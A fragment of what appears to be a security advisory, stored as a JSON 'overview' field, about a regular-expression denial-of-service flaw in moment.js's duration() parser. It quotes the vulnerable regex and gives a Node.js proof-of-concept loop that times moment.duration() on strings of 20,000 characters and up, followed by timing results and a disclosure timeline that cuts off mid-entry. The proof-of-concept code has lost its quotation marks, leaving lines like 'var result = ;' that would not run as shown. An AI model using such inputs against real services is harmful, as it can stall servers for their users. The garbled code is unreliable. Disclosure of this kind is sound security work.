  "overview": "moment is vulnerable to regular expression denial of service when user input is passed unchecked into moment.duration() blocking the event loop for a period of time.        The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time. [1]        Its not a huge amplification it takes about 25k characters to get 1.1 seconds however thats well under most servers max request size so its certainly exploitable.        The regular expression in question         moment/2.10.6/moment.js    ```    1679     var aspNetRegex = /(\\-)?(?:(\\d*)\\.)?(\\d+)\\:(\\d+)(?:\\:(\\d+)\\.?(\\d{3})?)?/;    ```            ### Proof of concept    ```    var moment = require(moment);        var genstr = function (len, chr) {        var result = ;        for (i=0; i<=len; i++) {            result = result + chr;        }            return result;    }            for (i=20000;i<=10000000;i=i+10000) {        console.log(COUNT:  + i);        var str = - + genstr(i, 1)        console.log(LENGTH:  + str.length);        var start = process.hrtime();        moment.duration(str)            var end = process.hrtime(start);        console.log(end);    }    ```        ### Results    ```    $ node moment.js    COUNT: 20000    LENGTH: 20002    [ 0, 618931029 ]    COUNT: 30001    LENGTH: 30003    [ 1, 401413894 ]    COUNT: 40002    LENGTH: 40004    [ 2, 437075303 ]    COUNT: 50003    LENGTH: 50005    [ 3, 824664804 ]    COUNT: 60004    LENGTH: 60006    [ 5, 651335262 ]    ```        ### Timeline:    - 10/26/2015 - Initial Discovery    - 10/26/2015 - Maintainers notified via email    - 12/16/2015 - Maintainers notified via email again    - 2/2/2016 - Added information to fix from pull request    - 2/3/2016 - ",
